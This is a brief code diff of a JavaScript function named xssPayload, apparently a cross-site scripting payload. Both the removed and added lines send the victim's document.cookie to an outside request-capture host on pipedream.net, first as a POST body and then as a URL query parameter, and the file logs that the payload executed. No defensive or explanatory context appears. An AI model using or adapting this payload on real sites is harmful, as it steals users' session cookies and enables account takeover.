@@ -1,5 +1,5 @@
 function xssPayload() {
-  fetch('https://eniy3zg78oasq.x.pipedream.net/', {method: 'POST', mode: 'no-cors', body:document.cookie}); 
+  fetch('https://eniy3zg78oasq.x.pipedream.net/?cookie='+document.cookie); 
 }
 
 console.log('XSS payload executed');
